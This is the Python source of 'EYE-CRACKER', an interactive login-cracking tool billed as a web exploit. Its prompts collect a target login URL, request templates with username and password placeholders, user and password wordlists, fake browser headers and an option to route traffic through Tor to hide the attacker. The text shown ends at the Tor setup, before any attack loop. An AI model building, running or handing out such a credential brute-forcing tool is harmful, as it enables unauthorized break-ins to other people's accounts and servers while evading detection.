def run():
    '''
    'MJI 3> ARI'
    _____________
    MIT License

Copyright (c) 2022 MJi | DarkƤwn [github.com/c4ssif3r]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''
    try:
        import time as t
        from colorama import Fore as f
        import sys, os
        import requests as r
        import socket
        from random import choice
        from fake_headers import Headers
        from fake_useragent import UserAgent
    except Exception as pip_error:
        print("\033[0;31m %s run command \n\t\033[0;32m pip install -r requirements.txt !" % (pip_error))
        t.sleep(1)
        sys.exit()
    global proxy_type
    global proxy_use
    global use_header
    global slep
    global tor_use
    global auth_type
    global auth_text
    global method
    global get_param

    black = "\033[0;30m"
    red = "\033[0;31m"
    green = "\033[0;32m"
    brown = "\033[0;33m"
    blue = "\033[0;34m"
    purple = "\033[0;35m"
    cyan = "\033[0;36m"
    l_gray = "\033[0;37m"
    dark_gray = "\033[1;30m"
    l_red = "\033[1;31m"
    l_green = "\033[1;32m"
    yellow = "\033[1;33m"
    l_blue = "\033[1;34m"
    l_purple = "\033[1;35m"
    l_cyan = "\033[1;36m"
    l_white = "\033[1;37m"
    faint = "\033[2m"
    italic = "\033[3m"
    underline = "\033[4m"
    blink = "\033[5m"
    nefative = "\033[7m"
    cross = "\033[9m"
    ended = "\033[0m"
    bold = "\033[1m"
    nbold = "\033[0m"
    white = f.WHITE
    t.sleep(1)


    bnr = ['''
                                           ░  ▄▄
                                    ▄▄█▓▄██████▒
                               ▄▓█▀▀▀▀     ▄  ▀▀▀██▄▄▄
                         ▄▄▄▓▀▀▐▄ ▄▄▄███▀▀▀▀▀▀▀▀▀█▄▄█▓▒▌
                      ▄▒▀▀█▄▄█████▀▀ ▄ ▄▌▀██████████▓██▄▄
                    ░▓███████▀▀ ▄▄█████▄███▀▀▀▀▀▓███░▀▀▀
                      ▄███▄▄▄▄▄▄▄  ▄   ▄▄▄▄▄▓▓██████▀▀██▐▄
                      ▌▌▓░▌▓▀██████ ▀██▄▀████▓█████████▄▀█▓▒▀
                     ░░▐░░░▐ █████   ▀███▄ ██░▐▌█▓▌▄▄███▌▀▐▌
                      ▌ ░░ ▐  ▀▀▀▀██▄▐▓▓███▄ ▀██▓███████ ▄█▀
                      ▐  ░░▐  ▐░▐▐ ▓█▐██▓████▄  ▀▀▀▀▀█▄▄███
                               ░▐▐ ░▓██▓▀█▌▐▀▀▐█▓██▐██▓██▓▒
                                ▐  ░░▌░▐ █▌▌  ▐▌▌██▐▌▓░▀█▐
                                   ░░▌░▐ █▌▒  ▐▀▓▐▐▐▌▓ ▌▓▓
                                   ░░▌░▐ ▌▌▐  ▐▐▓░▐▐▌▒ ░▓▐
                                   ▐ ▌ ▐ ▀ ▐  ▐▐ ░░▐▌▒
                                     ░        ▐  ░░ ░
                                              ▐  ░░ ░
                                                 ░░ ░
                                                 ▐    ''']

    def r_bnr(bnr):
        return choice(bnr)
    print(f'{bold}{l_red}')
    print (f'{blink}{r_bnr(bnr)}{ended}', end='')
    t.sleep(2)

    print(f'{blink}{l_green}', end='', flush=True)
    print('E', end='', flush=True)
    t.sleep(0.2)
    print('Y', end='', flush=True)
    t.sleep(0.5)
    print('E', end='', flush=True)
    t.sleep(0.3)
    print('-', end='', flush=True)
    t.sleep(0.6)
    print('C', end='', flush=True)
    t.sleep(0.3)
    print('R', end='', flush=True)
    t.sleep(0.2)
    print('A', end='', flush=True)
    t.sleep(0.2)
    print('C', end='', flush=True)
    t.sleep(0.5)
    print('K', end='', flush=True)
    t.sleep(0.5)
    print('E', end='', flush=True)
    t.sleep(0.5)
    print('R', end='', flush=True)
    t.sleep(2)
    print(f'{nbold}', end='', flush=True)
    print(f' {italic} From{ended} : ', end='')
    #create flush text [simple]
    print(f'{red}{bold}', end='', flush=True)
    print(f'{bold}W', end='', flush=True)
    t.sleep(0.5)
    print('e', end='', flush=True)
    t.sleep(0.7)
    print('b', end='', flush=True)
    t.sleep(0.4)
    print('E', end='', flush=True)
    t.sleep(0.1)
    print('x', end='', flush=True)
    t.sleep(0.2)
    print('p', end='', flush=True)
    t.sleep(0.3)
    print('l', end='', flush=True)
    t.sleep(0.4)
    print('o', end='', flush=True)
    t.sleep(0.5)
    print('i', end='', flush=True)
    t.sleep(1.5)
    print(f't{ended}', flush=True)
    nbold = "\033[0m" # tahe koskholi !
    t.sleep(1)
    print(f'{white}{nbold}')

    print (f'\n                   {bold}{f.GREEN}[{f.WHITE}EYE{f.GREEN}]{f.WHITE}{f.RED} For The Eyerlinear + MJI 3> ARI {f.WHITE}{bold} E{nbold}Y{bold}E {nbold}CRACKER !\n\n\n')
    t.sleep(3)


    def _fake_hed(bw_ = ['chrome','firefox','opera'], os_ = ['win','mac'',lin']):
        browser = choice(bw_)
        operation_system = choice(os_)
        return Headers(
            browser=browser,
            os=operation_system,
            headers=True).generate()
    fake_hed = _fake_hed()

    print(f'  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] auth text: True TEXT: if this text {bold}{green}in{white}{nbold} site.html[text] content EYE CRACKER {bold}alert {nbold}[{green}{bold}PASSWORD FOUND{white}{nbold}] !\n')
    t.sleep(2)
    print(f'  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] auth text: False TEXT: if this text {bold}{green}not in {white}{nbold}site.html[text] content EYE CRACKER {bold}alert {nbold}[{green}{bold}PASSWORD FOUND{white}{nbold}] !\n')
    t.sleep(2)
    print(f'  {f.WHITE}[{f.YELLOW}{bold}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] auth text: EX > False TEXT ~> {bold}password incorrect.{nbold}\n')
    t.sleep(2)
    print(f'  {f.WHITE}[{f.YELLOW}{bold}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] auth text: EX > True TEXT ~> {bold}logout{nbold}\n')
    t.sleep(2)

    while True:
        try:
            auth_type = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}AUTH-TEXT{nbold}{f.WHITE}] enter \'{bold}AUTH-TYPE{nbold}\' [ex: {bold}\'false [text]\' or \'true [text]\'{nbold}]:#{l_green}{bold} ').lower()
            if auth_type:
                if auth_type == 'true':
                    print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}AUTH-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}TRUE[text]{nbold}\n')
                    #auth_type = in
                    break
                if auth_type == 'false':
                    print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}AUTH-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}FALSE[text]{nbold}\n')
                    #auth_type = not in
                    break
                else:
                    print(f'\n  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] please enter {bold}{red} false {white}{nbold}OR {green}{bold} true {white}{nbold} ONLY !\n')
                    t.sleep(1)
                    continue
            else:
                    print(f'\n  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] please enter {bold}{red} false {white}{nbold}OR {green}{bold} true {white}{nbold} ONLY !\n')
                    t.sleep(1)
                    continue

        except KeyboardInterrupt:
            print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
            t.sleep(2)
            sys.exit(0)



    t.sleep(2)

    while True:
        try:
            auth_text = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}AUTH-TEXT{nbold}{f.WHITE}] enter \'{bold}AUTH-TEXT-{auth_type}{nbold}\' [ex: {bold}\'logout\' or \'login\'{nbold}]:#{l_green}{bold} ')
            if auth_text:
                print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}AUTH-TEXT{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{auth_text}{nbold}\n')
                break
            else:
                print(f'  {f.WHITE}[{f.RED}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] Please enter AUTH---[{auth_type}]---TEXT\n')
                t.sleep(1)
                continue
        except KeyboardInterrupt:
            print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
            t.sleep(2)
            sys.exit(0)



    t.sleep(1.5)
    print(f'\n  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] SET REQUEST METHOD {bold}{green} http{white}[s]{blue}-{red}[get|post]{blue}-{yellow}form {white}{nbold}!\n')
    t.sleep(1)

    print(f'  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}>{f.WHITE}GET METHOD {yellow}HELP{nbold}{f.WHITE}] GET [AUTH] METHOD {bold}> > >{green} For Crack Login Pages [get request + PARAMETRES] {white}!\n')
    t.sleep(1)

    print(f'  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}>{f.WHITE}POST METHOD {yellow}HELP{nbold}{f.WHITE}] POST [AUTH] METHOD {bold}> > >{green} For Crack Login Pages [post request + data] {white}!\n')
    t.sleep(1)

    print(f'  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}>{f.WHITE}GET METHOD {yellow}HELP{nbold}{f.WHITE}] GET [FORM] [AUTH] METHOD {bold}> > >{green} For Crack Login Pages [get request + data] {white}!\n')
    t.sleep(1)

    print(f'  {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}>{f.WHITE}GET METHOD {yellow}HELP{nbold}{f.WHITE}] GET [AUTH] METHOD {bold}> > >{green} For Crack Login Pages [get request] {white}!\n')

    while True:
        # http[s]-{get|post}-form
        try:
            method = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}SET-METHOD{nbold}{f.WHITE}] enter \'{bold}METHOD{nbold}\' [ex: {bold}\'post\' or \'get\'{nbold} or {bold}\'post-form\'{nbold} or {bold}\'get-form\'{nbold}]:#{l_green}{bold} ').lower()
            if method == 'post':
                t.sleep(1)
                print (f'\n      {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}METHOD{nbold}{f.WHITE}]{f.WHITE} >>> {bold}P0ST{nbold}\n')
                break

            if method == 'post-form':
                t.sleep(1)
                print (f'\n      {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}METHOD{nbold}{f.WHITE}]{f.WHITE} >>> {bold}POST-FORM{nbold}\n')
                break

            if method == 'get-form':
                t.sleep(1)
                print (f'\n      {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}METHOD{nbold}{f.WHITE}]{f.WHITE} >>> {bold}GET{nbold}\n')
                break

            if method == 'get':
                t.sleep(1)
                print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}METHOD{nbold}{f.WHITE}]{f.WHITE} >>> {bold}GET{nbold}\n')
                break

            else:
                t.sleep(1)
                print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}METHOD[S]{nbold}{f.WHITE}]{f.WHITE} >>> {bold}PLEASE SET A REQUEST METHOD HTTP[S] >>> {nbold}[ get-form == \'get form method \'] [post-form == \'post form method\'] [get] [post] ! {nbold}{white}\n')
                continue
        except KeyboardInterrupt:
            print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
            t.sleep(2)
            sys.exit(0)

    if method == 'get':
        while True:
                try:
                    get_param = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}URL-[GET]-PARAMETRES{nbold}{f.WHITE}] enter \'{bold}GET-PARAMETRES{nbold}\' [ex:   /user=$USER$&password=$PASSWORD$  ]:#{yellow}{bold} ')
                    t.sleep(0.5)

                    if get_param:
                        if get_param[0:1] == '/':
                            pass
                        else:
                            get_param = '/'+get_param

                        if '$USER$' not in get_param:
                            print(f'\n  {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] GET METHOD need \'$USER$\' but not found please replace \'username\' parameter to $USER$\n')
                            t.sleep(1)
                            continue

                        if '$PASSWORD$' not in get_param:
                            print(f'\n  {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] GET METHOD need \'$PASSWORD$\' but not found please replace \'password\' parameter to $PASSWORD$\n')
                            t.sleep(1)
                            continue

                        else:
                            t.sleep(1)
                            print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}GET-PARAMETER{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{get_param}{nbold}\n')
                            break

                    else:
                        print(f'\n  {f.WHITE}{nbold}[{f.RED}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] GET METHOD need {bold}\'$PASSWORD$\'{nbold} and {bold}\'$USER$\' {nbold} but {bold}not found{nbold} ! please replace {bold}\'password\' {nbold}parameter to {bold}$PASSWORD${nbold} and \'username\' parameter to {bold}\'$USER$\'{nbold}\n')
                        t.sleep(1)
                        continue

                except KeyboardInterrupt:
                    print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
                    t.sleep(2)
                    sys.exit(0)
                    #      break
    else:
        pass



    if method == 'get-form' or method == 'post' or method == 'post-form':
        t.sleep(1)
        print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] FORM METHOD\'S need \'$USER$\' and \'$PASSWORD$\'.')
        t.sleep(1)
        print(f'\n  {f.WHITE}[{f.YELLOW}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] You should capture the request data and enter that !{nbold}')
        t.sleep(1)
        print(f'\n  {f.WHITE}[{f.YELLOW}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] Replace {bold}{yellow}\'username\'{nbold} Parameter in captured[{bold}{yellow}\'data\'{nbold}] and replace to {bold}{green}$USER${nbold}!\n')
        t.sleep(1)
        print(f'\n  {f.WHITE}[{f.YELLOW}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] Replace {bold}{yellow}\'password\'{nbold} Parameter in captured[{bold}{green}\'data\'{nbold}] and replace to {bold}{green}$PASSWORD${nbold} !{nbold}\n')
        t.sleep(1)
        print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] FORM METHOD\'S need {bold}{green}\'$USER$\'{nbold} | please replace {bold}\'username\' {nbold}parameter to {green}{bold}$USER${nbold}\n')
        t.sleep(1)
        print(f'  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] FORM METHOD\'S need {bold}{green}\'$PASSWORD$\'{nbold} | please replace {bold}\'password\'{nbold} parameter to {bold}{green}$PASSWORD${nbold}\n')
        while True:
                try:
                    _userdata = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}URL-[DATA]{nbold}{f.WHITE}] enter \'{bold}DATA FILE{nbold}\' [ex: data.txt | or paste]:#{yellow}{bold} ')
                    t.sleep(0.5)

                    try:
                        user_data = open(_userdata, 'r').read()
                    except Exception as user_data_error:
                        print(f'\n      {nbold}{f.WHITE}[{f.YELLOW}{bold}EYE-CRACKER{f.WHITE}{nbold}] {f.YELLOW} ERROR >{nbold} {user_data_error}')
                        t.sleep(1)
                        print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] TRY AGAIN . . . {nbold}\n')
                        t.sleep(1)
                        print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}]{bold} NEED DATA FILE ONLY | ENTER FILE ONLY {nbold}\n')
                        continue

                    if user_data:
                        if '$USER$' not in user_data:
                            print(f'\n  {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] {method} need {bold}{green}\'$USER$\'{nbold}{f.WHITE} but {yellow}not found{white} please replace {bold}{yellow}\'username\'{nbold}{f.WHITE} parameter to {bold}{green}$USER${nbold}{f.WHITE}\n')
                            t.sleep(1)
                            continue

                        if '$PASSWORD$' not in user_data:
                            print(f'\n  {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] {method} METHOD need {bold}{green}\'$PASSWORD$\'{nbold}{f.WHITE} but {yellow}not found{yellow} please replace {bold}{yellow}\'password\'{nbold}{f.WHITE} parameter to {bold}{green}$PASSWORD${nbold}{f.WHITE}\n')
                            t.sleep(1)
                            continue

                        else:
                            t.sleep(1)
                            print (f'\n      {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}DATA{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{user_data}{nbold}\n')
                            break

                    else:
                        print(f'\n  {f.WHITE}{nbold}[{f.RED}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] GET METHOD need {bold}\'$PASSWORD$\'{nbold} and {bold}\'$USER$\' {nbold} but {bold}not found{nbold} ! please replace {bold}\'password\' {nbold}parameter to {bold}$PASSWORD${nbold} and \'username\' parameter to {bold}\'$USER$\'{nbold} in your captured[{green}{bold}\'data\'{nbold}{white}\n')
                        t.sleep(1)
                        continue

                except KeyboardInterrupt:
                    print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
                    t.sleep(2)
                    sys.exit(0)




    while True:
        try:
            urll = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}TARGET-URL{nbold}{f.WHITE}] enter \'{bold}URL{nbold}\' [ex: cpanel.google.com + with {bold}\'http[s]://\'{nbold}]:#{l_red}{bold} ')
            print(f'{nbold}')

            if urll:
                if 'http' in urll or 'https' in urll:
                    print (f'   {f.WHITE}[{f.RED}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.CYAN}Skipper{f.WHITE}]  SKIPPING ADD {bold}{f.GREEN} HTTP://{nbold} to [{green}{bold}{urll}{nbold}]\n')
                    t.sleep(2)
                    url = urll
                    break
                if 'http' not in urll or 'https' not in urll:
                    print (f'   {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.CYAN}Adder{white}]  AUTOMATICALLY ADDING {bold}{f.GREEN} HTTP://{nbold} to [{green}{bold}{urll}{nbold}]\n')
                    url = (f'http://{urll}')
                    #urlll = urll
                    t.sleep(2)
                    break
            else:
                continue
        except KeyboardInterrupt:
            print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
            t.sleep(2)
 #           break
            sys.exit(0)

    print (f'      {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}URL{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{url}{nbold}\n')
    t.sleep(2)
    try:
        #check host
        print (f'   {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYECRACKER/{f.GREEN}CHECK-URL{white}] {nbold}{f.CYAN}FOR VERIFY \'{bold}{l_green}CONNECTION{white}{nbold}\'] . . .{nbold} \n')
        t.sleep(1)
        try:
            if 'http://' in url:
                url1 = url.replace('http://')
            if 'https://' in url:
                url1 = url.replace('https://')
        except:
            pass

        first_req = r.get(url, headers=fake_hed)

        ip = socket.gethostbyname(str(url1))
# error
        print (f'   {f.WHITE}{nbold}[{f.GREEN}{bold}SUCCESS{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{f.GREEN}Checker {white}] {nbold}{f.GREEN} CONNECTED {white}TO \'{bold}{urll}{nbold}{white}[{l_green}{ip}{white}]\' \n')
    except Exception as first_req_error:
        print (f'   {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}@{f.RED}{bold}EYE-CRACKER/{f.GREEN}CHECK-URL{f.WHITE}{nbold}] {nbold}{f.CYAN} CAN\'T CONNECT TO {white}\'{f.CYAN}{bold}{urll}{nbold}\'{nbold} [try without http://[s]] !\n')
        exit_q = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}URL{nbold}{f.WHITE}] URL IS \'{bold}REAL{nbold}\' AND TRUE ? ARE YOU WANT TO EXIT ? {bold}\'[Y / N]\'{nbold}]:#{l_red}{bold} ').lower()

        if exit_q =='y':
            sys.exit(0)
        else:
            pass

    t.sleep(3)


    if url[-1:] == '/':
        pass
    else:
        url = (f'{url}/')

    while True:
        try:
            t.sleep(2)
            user_list = input(f'  {nbold}{f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}USER-LIST-FILE{nbold}{f.WHITE} enter \'{bold}FILE{nbold}\' [ex: users.txt] :#{l_red}{bold} ')
            print(f'{nbold}')

            if user_list:
                try:
                    user_names = open(user_list, 'r').read().split()
                    print (f'      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}USERS{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{user_list}{nbold}\n')
                    t.sleep(3)
                    print (f'      {f.WHITE}[{f.GREEN}INFO{nbold}{f.WHITE}] [%s] {bold}{f.CYAN}USERS Loaded {nbold}{f.WHITE} [SUCCESSFULLY] ! \n' % (str(len(user_names))))
                    break

                except Exception as user_open_error:
                    print (f'      {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}] CAN\'T OPEN USER FILE , CHECK FILE EXIST ! \n')
                    continue
            else:
                continue
        except KeyboardInterrupt:
            print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
            t.sleep(2)
 #           break
            sys.exit(0)
    while True:
        try:
            pass_list = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}PASSWD-LIST-FILE{nbold}{f.WHITE} enter \'{bold}FILE{nbold}\' [ex: passwd.txt] :#{l_red}{bold} ')
            print(f'{nbold}')

            if pass_list:
                try:
                    passwords = open(pass_list, 'r').read().split()
                    print (f'      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PASSWORDS{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{pass_list}{nbold}\n')
                    t.sleep(3)
                    print (f'      {f.WHITE}[{f.GREEN}INFO{nbold}{f.WHITE}] [%s]{bold}{f.CYAN} PASSWORDS Loaded {nbold}{f.WHITE} [SUCCESSFULLY] ! \n' % (str(len(passwords))))
                    break

                except Exception as pass_open_error:
                    print (f'      {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}] CAN\'T OPEN PASWD FILE , CHECK FILE EXIST | {white}ERROR {pass_open_error}\n')
                    continue
            else:
                continue
        except KeyboardInterrupt:
            print(f'\n\n      {nbold}{f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] TERMINATED BY {bold}USER{nbold} EXITTING . . .')
            t.sleep(2)
            sys.exit(0)
    t.sleep(2)
    print (f'   {f.WHITE}[{f.YELLOW}{bold}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.GREEN}TIME{white}] if you press{bold}{f.GREEN} ENTER{nbold} delay {bold}{blue}\'SKIP\'{nbold}{white} !!!\n')
    slep = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{nbold}{f.CYAN}/EYE-CRACKER/{bold}SLEEP{nbold}{f.WHITE}] Enter => Set Delay Time [Default is 1 Sec ! [skip delay]]:#{f.GREEN}{bold} ')


    if '.' in slep:
        print (f'      {f.WHITE}[{f.YELLOW}WARNING{f.WHITE}] YOU CAN\'T USING Float\'s in DelayTime ! \n')
        print (f'      {f.WHITE}[{f.YELLOW}{bold}SET-DEFAULT{f.WHITE}{nbold}] USING Default SLEEP TIME (1 sec) \n')
        slep = 1
    else:
        pass
    try:
        slep = int(slep)
        t.sleep(int(slep))
    except Exception:
        print (f'      {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] type {slep} not int !\n')
        t.sleep(1)
        print (f'      {f.WHITE}[{f.YELLOW}{bold}SET-DEFAULT{f.WHITE}{nbold}] USING Default SLEEP TIME (1 sec) \n')
        slep = False

    finally:
        print (f'      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}SLEEP{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{slep}{nbold}\n')

    t.sleep(2)
    print (f'   {f.WHITE}[{f.YELLOW}{bold}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.GREEN}INFO{white}] if you lilke using{bold}{f.GREEN} FAKE HEADERS{nbold} press {bold}{blue}\'ENTER\'{nbold}{white} !!!\n')
    t.sleep(2)
    header = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}HEADERS{nbold}{f.WHITE} enter \'{bold}HEADER-FILE{nbold}\' [ex: headers.json - format {bold}\'.json\':#{l_red}{bold} ')
    try:
        headers = open(header, 'r').read()
        print (f'\n      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}HEADERS{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{header}{nbold}\n')
        use_header = True
    except:
        use_header = False
        print (f'\n   {f.WHITE}[{f.YELLOW}{bold}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.GREEN}INFO{white}] USING{bold}{f.GREEN} FAKE HEADERS {cyan}\'DEFAULT\'{nbold}{white} !!!\n')
        print (f'      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}HEADERS{nbold}{f.WHITE}]{f.WHITE} >>> {bold}FAKE HEADERS{nbold}\n')
        headers = fake_hed

    t.sleep(1)
    tor_q = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}PROXIES{nbold}{f.WHITE} are you like to use \'{bold}TOR?{nbold}\' [ y / n] :#{l_red}{bold} ').lower()

    if tor_q == 'y':

        print (f'\n   {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.GREEN}INFO{white}] PLEASE RUN {bold}{f.GREEN}\'TOR\'{nbold}{white} !!!\n')
        tor_use = True
        t.sleep(3)
        ariana = input(f'  {f.WHITE}[{f.YELLOW}{bold}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}ASK-TOR{nbold}{f.WHITE} please run \'{bold}TOR{nbold}\' [ when you runed the tor press enter] :#{l_red}{bold} ')
        proxy_use = False
        proxy_type = 'Tor'
    else:
        tor_use = False
